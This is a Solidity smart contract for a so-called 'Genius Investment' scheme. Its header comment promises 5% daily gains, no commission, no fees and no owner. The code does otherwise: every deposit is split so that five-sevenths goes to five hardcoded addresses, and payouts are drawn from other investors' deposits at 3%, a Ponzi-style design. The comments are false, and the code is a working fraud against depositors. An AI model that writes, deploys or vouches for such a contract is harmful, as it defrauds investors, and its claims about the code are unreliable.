pragma solidity ^0.4.24;
/**
 *
 * 
 * 
 * 
 * 

- ▒█▀▀█ █▀▀ █▀▀▄ ░▀░ █░░█ █▀▀ 　 ▀█▀ █▀▀▄ ▀█░█▀ █▀▀ █▀▀ ▀▀█▀▀ 
- ▒█░▄▄ █▀▀ █░░█ ▀█▀ █░░█ ▀▀█ 　 ▒█░ █░░█ ░█▄█░ █▀▀ ▀▀█ ░░█░░ 
- ▒█▄▄█ ▀▀▀ ▀░░▀ ▀▀▀ ░▀▀▀ ▀▀▀ 　 ▄█▄ ▀░░▀ ░░▀░░ ▀▀▀ ▀▀▀ ░░▀░░ 

- █▀▀█ █▀▀ █▀▀█ 　 █▀▀▄ █▀▀█ █░░█ 　 █▀▀ 　 　  ▒█▀▀█ █▀▀█ █▀▀█ █▀▀ ░▀░ ▀▀█▀▀ 
- █░░█ █▀▀ █▄▄▀ 　 █░░█ █▄▄█ █▄▄█ 　 ▀▀▄ %　 　 ▒█▄▄█ █▄▄▀ █░░█ █▀▀ ▀█▀ ░░█░░ 
- █▀▀▀ ▀▀▀ ▀░▀▀ 　 ▀▀▀░ ▀░░▀ ▄▄▄█ 　 ▄▄▀ 　 　  ▒█░░░ ▀░▀▀ ▀▀▀▀ ▀░░ ▀▀▀ ░░▀░░ 

 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * Genius Investment Contract
 *  - GAIN 5% PER 24 HOURS(every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 100000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract GeniusInvest {
    address adcost;
    address projectcom;
    address transcom;
    address pay1;
    address pay2;
    
    function GeniusInvest() {
        adcost = 0x47e82527E90031D281c7dCE0e36Ae676914c3921;
        projectcom = 0x8B775a54d6078D53E4A023366AcD1BcC437f0b62;
        transcom = 0x6cF906597fd441F7EF80ffE57C5fe60a73d0504B;
        pay1 = 0x54Cf7A3288142F476A7577243A1a845a86f7c69e;
        pay2 = 0x8b3b9d2a57B0806C2A33f191e3b08eb04bC1A182;
    }
    
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;

    function() external payable {
        uint256 getmsgvalue = msg.value / 7;
        adcost.transfer(getmsgvalue);
        projectcom.transfer(getmsgvalue);
        transcom.transfer(getmsgvalue);
        pay1.transfer(getmsgvalue);
        pay2.transfer(getmsgvalue);
        if (balances[msg.sender] != 0){
        address sender = msg.sender;
        uint256 getvalue = balances[msg.sender]*3/100*(block.number-timestamp[msg.sender])/5900;
        sender.transfer(getvalue);
        }

        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;

    }
}